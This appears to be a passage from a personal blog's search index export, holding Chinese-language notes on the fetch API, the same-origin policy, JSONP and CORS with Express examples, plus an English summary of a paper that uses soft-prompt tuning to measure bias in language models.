<td align="center">返回<code>boolean</code>，表示請求是否成功</td>
</tr>
<tr>
<td align="center"><code>res.status</code></td>
<td align="center">返回數字，表示<code>HTTP</code>響應的狀態碼（例如：200表示請求成功）</td>
</tr>
<tr>
<td align="center"><code>res.statusText</code></td>
<td align="center">返回狀態的文本信息</td>
</tr>
<tr>
<td align="center"><code>res.url</code></td>
<td align="center">返回請求的<code>url</code>地址值</td>
</tr>
</tbody></table>
</li>
<li><p>常見方法：</p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">含義</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>res.json()</code></td>
<td align="center">得到 JSON 對象</td>
</tr>
<tr>
<td align="center"><code>res.text()</code></td>
<td align="center">得到文本字符串</td>
</tr>
<tr>
<td align="center"><code>res.blob()</code></td>
<td align="center">得到二進制 Blob 對象</td>
</tr>
<tr>
<td align="center"><code>res.formData()</code></td>
<td align="center">得到 FormData 表單對象</td>
</tr>
<tr>
<td align="center"><code>res.arrayBuffer()</code></td>
<td align="center">得到二進制 ArrayBuffer 對象</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="POST請求"><a href="#POST請求" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fetch()</code>可以傳遞第二個參數指定請求的方式</li>
<li>配置參數：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;url&#x27;</span>, &#123;</span><br><span class="line">    <span class="comment">// 請求方法</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="comment">// 設置請求頭</span></span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="comment">// 數據格式</span></span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 配置請求體數據</span></span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>JSON格式：</p>
<ul>
<li>設置請求頭：<code>&#39;Content-Type&#39;: &#39;application/json&#39;</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>, <span class="attr">gender</span>: <span class="string">&#x27;M&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_post&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">json</span>())</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>urlencoded</code>格式：</p>
<ul>
<li>設置請求頭：<code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_post&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&#x27;name=Donald&amp;age=18&amp;gender=M&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">json</span>())</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="fetch函數封裝"><a href="#fetch函數封裝" class="headerlink" title="fetch函數封裝"></a>fetch函數封裝</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fetch</code>相比<code>XMLHttpRequest</code>已經方便很多，但參數仍須自己處理<ul>
<li><code>GET</code>, <code>DELETE</code>的請求參數需要寫在地址欄裡</li>
<li><code>PUT</code>, <code>PATCH</code>, <code>POST</code>的請求參數需要轉JSON設置請求頭</li>
</ul>
</li>
</ul>
</li>
<li><p>二次封裝效果：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 發送GET、DELETE請求</span></span><br><span class="line"><span class="title function_">http</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;XXX&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;...&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 發送POST、PUT、PATCH請求</span></span><br><span class="line"><span class="title function_">http</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;XXX&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;...&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">http</span>(<span class="params">&#123;method, url, params, data&#125;</span>)&#123;</span><br><span class="line">    <span class="comment">// params 需要轉換成 key=value&amp;key=value 的形式</span></span><br><span class="line">    <span class="keyword">if</span>(params)&#123;</span><br><span class="line">        <span class="comment">// 固定寫法： new URLSearchParams(params).toString()</span></span><br><span class="line">        <span class="keyword">let</span> str = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(params).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="comment">// 拼接到 url</span></span><br><span class="line">        url += <span class="string">&#x27;?&#x27;</span> + str</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最終結果</span></span><br><span class="line">    <span class="keyword">let</span> res</span><br><span class="line">    <span class="comment">// data 需要寫完整的代碼</span></span><br><span class="line">    <span class="keyword">if</span>(data)&#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">            method,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS</title>
    <url>/myBlog/2022/08/02/2022/FrontEnd/2022-8-2-CORS/</url>
    <content><![CDATA[<h1 id="AJAX跨域問題"><a href="#AJAX跨域問題" class="headerlink" title="AJAX跨域問題"></a>AJAX跨域問題</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ol>
<li><p>簡介：</p>
<ul>
<li>同源策略 (Same-Origin-Policy) 由 Netscape 提出的一個安全策略，如今所有支持 JavaScript 的瀏覽器都會使用這個策略</li>
<li>Web 是建構在同源策略基礎之上，瀏覽器只是針對同源策略的一種實現</li>
<li>同源：協議、域名(IP)、端口<font color="#f54747">必須完全相同</font><br>  即：協議、域名、端口都相同，才能算是在同一個域裡</li>
</ul>
</li>
<li><p>例子：</p>
<ul>
<li>假設已有網站地址：<a href="http://study.com/">http://study.com</a><table>
<thead>
<tr>
<th>請求地址</th>
<th align="center">形式</th>
<th align="center">結果</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://study.com/test/a.html">http://study.com/test/a.html</a></td>
<td align="center">協議、域名、端口相同</td>
<td align="center">成功</td>
</tr>
<tr>
<td><a href="http://study.com/user/a.html">http://study.com/user/a.html</a></td>
<td align="center">協議、域名、端口相同</td>
<td align="center">成功</td>
</tr>
<tr>
<td><a href="http://a.study.com/test/a.html">http://a.study.com/test/a.html</a></td>
<td align="center">域名不同</td>
<td align="center">失敗</td>
</tr>
<tr>
<td><a href="http://study.com:8080/test/a.html">http://study.com:8080/test/a.html</a></td>
<td align="center">端口不同</td>
<td align="center">失敗</td>
</tr>
<tr>
<td><a href="https://study.com/test/a.html">https://study.com/test/a.html</a></td>
<td align="center">協議不同</td>
<td align="center">失敗</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>沒有同源策略的危險性：</p>
<ul>
<li>釣魚網站模擬登錄頁面，如果沒有同源策略，就可以即時使用 AJAX 竊取用戶輸入的帳號與密碼</li>
<li>例子：  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;google&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> iframe = <span class="variable language_">window</span>.<span class="property">iframe</span>[<span class="string">&#x27;google&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> inputNode = iframe.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;xxx&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>非同源收到的限制：</p>
<ol>
<li>Cookie 不可讀取</li>
<li>DOM 無法獲取</li>
<li>Ajax 請求不能獲取數據</li>
</ol>
</li>
</ol>
<h2 id="JSONP解決跨域"><a href="#JSONP解決跨域" class="headerlink" title="JSONP解決跨域"></a>JSONP解決跨域</h2><ol>
<li><p>簡介：</p>
<ul>
<li>JSONP (JSON with Padding) 是一個非官方的跨域解決方案，純粹憑藉程序員的聰明才發出來</li>
<li><font color="#f54747">只支持GET請求</font></li>
</ul>
</li>
<li><p>JSONP原理：</p>
<ul>
<li>繞過<code>xhr</code>，借助<code>script</code>發請求不受同源策略的限制把數據傳遞</li>
</ul>
</li>
<li><p>基本使用：</p>
<ul>
<li>在後端服務器上響應一個函數，數據作為函數的參數（以<code>JSON.stringify</code>轉成字符串）</li>
<li>在前端定義一個重名的函數，然後以<code>script</code>標籤發送請求</li>
<li>服務器編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_jsonp/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> person = [&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;]</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">`demo(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(person)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 創建 script 節點</span></span><br><span class="line">    <span class="keyword">const</span> scriptNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    <span class="comment">// 2. 給節點指定 src 屬性</span></span><br><span class="line">    scriptNode.<span class="property">src</span> = <span class="string">&#x27;http://127.0.0.1:8080/test_jsonp&#x27;</span></span><br><span class="line">    <span class="comment">// 3. 將節點放入頁面</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(scriptNode)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">demo</span> = <span class="function">(<span class="params">person</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>優化：</p>
<ul>
<li>基於使用 JSONP 必須要前後端定義同一個函數名，前端可以使用<code>query</code>形式傳遞函數名給後端，後端基於此函數名響應函數</li>
<li>服務器編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 優化一、動態創建函數名</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_jsonp/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;callback&#125; = request.<span class="property">query</span></span><br><span class="line">    <span class="keyword">const</span> person = [&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;]</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;callback&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(person)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">scriptNode.<span class="property">src</span> = <span class="string">&#x27;http://127.0.0.1:8080/test_jsonp?callback=test&#x27;</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">test</span> = <span class="function">(<span class="params">person</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 優化二、移除已經使用過的 script 節點</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(scriptNode)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>jQuery封裝的JSONP</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">getJSON</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jsonp?callback=?&#x27;</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><ol>
<li><p>簡介：</p>
<ul>
<li>CORS (Cross-Origin Resource Sharing) 跨域資源共享，CORS 是官方的跨域解決方案</li>
<li>它的特點在於<font color="#f54747">不需要在客戶端做任何特殊的操作，完全在服務器中進行處理</font>，支持所有常見請求</li>
</ul>
</li>
<li><p>配置響應頭：</p>
<ol>
<li><p>允許獲取數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>允許獲取響應頭：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>允許複雜請求：</p>
<ul>
<li>由於<code>PUT</code>和<code>DELETE</code>這些複雜請求在真正請求之前會發送一個預請求，因此要對預請求也配置響應頭 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 響應PUT請求</span></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/test_put&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">&#x27;hello_test_put&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 響應預請求</span></span><br><span class="line">app.<span class="title function_">options</span>(<span class="string">&#x27;/test_put&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">send</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用<code>cors</code>中間件</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add cors</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入、註冊並使用：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>())</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>重點：</p>
<ol>
<li>前端人員無需進行任何特殊操作</li>
<li>用<code>cors</code>解決跨域不是設置一兩個響應頭就能解決</li>
<li><code>PUT</code>和<code>DELETE</code>請求都是複雜請求，這些請求在真正請求之前必須進行一次預請求</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>Image Classification</title>
    <url>/myBlog/2023/06/26/2023/CSCI3180/2023-6-26-CS231N-Image-Classification/</url>
    <content><![CDATA[<h2 id="Semantic-Gap"><a href="#Semantic-Gap" class="headerlink" title="Semantic Gap"></a>Semantic Gap</h2><img  />




<!-- 
<img src="https://p.ipic.vip/1zz58f.png" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>Computer Vision</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>Weekly Paper Reading</title>
    <url>/myBlog/2023/06/29/2023/Summer/2023-6-29-Weekly-Paper-Reading/</url>
    <content><![CDATA[<h3 id="2023-06-29"><a href="#2023-06-29" class="headerlink" title="2023-06-29"></a>2023-06-29</h3><ul>
<li><p><strong>Title:</strong> <a href="https://arxiv.org/abs/2306.04735">Soft-prompt Tuning for Large Language Models to Evaluate Bias</a> (arXiv 2023)</p>
</li>
<li><p><strong>Author:</strong> Jacob-Junqi Tian, David Emerson, Sevil Zanjani Miyandoab, Deval Pandya, Laleh Seyyed-Kalantari, Faiza Khan Khattak</p>
</li>
<li><p><strong>Summary:</strong><br>  Soft-prompt tuning is an automatic prompt optimization that can optimize the performance of LLM by training a small set of prompt token embeddings. In this paper, they utilize soft-prompt tuning to evaluate the bias in Open Pre-trained Transformers and Galactica language models by measuring the fairness metrics (accuracy Gap and FPR Gap) on two sentiment analysis tasks (<em>SemEval-2018</em> and <em>SST-5</em>).</p>
</li>
<li><p><strong>Methodology:</strong></p>
<ul>
<li><p>Example Prompts:</p>
  <img src="https://p.ipic.vip/k0p2lc.png" width="350px" />
</li>
<li><p>The fairness FPR (False Positive Rate) Gap is measured using the metric M: </p>
<p>  $$d_{M}(x) &#x3D; M(x) - \overline{M}$$</p>
<p>  <strong>Positive FPR Gap</strong>: Evaluates the FPR for groups classified as negative or neutral but predicted as positive<br>  <strong>Negative FPR Gap</strong>: Evaluates the FPR for groups classified as positive or neutral but predicted as negative</p>
</li>
<li><p>Bias Evaluation (the sensitive attributes and respective protected groups):<br>  <strong>Age</strong>: {adult, old, young}, <strong>Sexuality</strong>: {asexual, bisexual, heterosexual, homosexual, other}</p>
</li>
<li><p>Model size:<br>  <strong>Open Pre-trained Transformer (OPT) models</strong> with parameter sizes of <em>350M</em>, <em>1.3B</em>, <em>2.7B</em>, <em>6.7B</em> and <em>13B</em><br>  <strong>Galactica language models</strong> with parameter sizes of <em>1.3B</em> and <em>6.7B</em></p>
</li>
</ul>
</li>
<li><p><strong>Soft-Prompt Tuning Procedure:</strong></p>
  <img src="https://p.ipic.vip/0csf2e.png" width="500px" />

<ol>
<li>Orange depicted: the prompt tokens that are initialized as the beginning-of-sequence token embedding</li>
<li>Adding a series of tokens T &#x3D; {t1, t2, …, tn} to the model input text X, to maximize the log-likelihood of the generative probability of a target token Y, P(Y|T;X)</li>
</ol>
<ul>
<li>All weights of the model are frozen (to preserve the biases inherited from pretraining)</li>
</ul>
</li>
<li><p><strong>Results Analysis (Main Concerns):</strong></p>
  <img src="https://p.ipic.vip/gh0qnn.png" width="700px" />

<ul>
<li><p><strong>Sexuality:</strong></p>
<ul>
<li><em>asexual group</em>: a consistently lower positive FPR gap in both datasets (it benefits less from model mistakes and suffers a harmful error rate)</li>
<li><em>homosexual group</em>: a consistently higher negative-class FPR in both datasets</li>
</ul>
</li>
<li><p><strong>Age:</strong></p>
<ul>
<li><em>adult group</em>: a favorable increase on SST-5 and a lower negative error rate on SemEval</li>
<li><em>old and young groups</em>: a higher probability of errors but no significant gaps</li>
</ul>
  <img src="https://p.ipic.vip/fxga87.png" width="250px" />

<p>  Presents the concerned groups using a table of net number times gap, it suggests that there exists a potential harmful bias in <em>asexual</em> and <em>homosexual</em> groups. (<em><font color="F54747">Red indicates the harmful direction of significant gaps</font></em>)</p>
</li>
</ul>
</li>
<li><p><strong>Conclusion:</strong><br>  Soft-prompt tuning is an effective technique for addressing potential biases in LLMs. In this paper, they explored the possibility of using the soft-prompt tuning technique on LLMs’ sentiment classification. Results are analyzed in multi-dimensions: cross datasets, different prompt-tuning and fairness metrics measurement. They provided some future works, like more complex prompts and higher-quality datasets.</p>
</li>
</ul>
<!-- 
<img src="https://p.ipic.vip/1zz58f.png" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
  </entry>
</search>
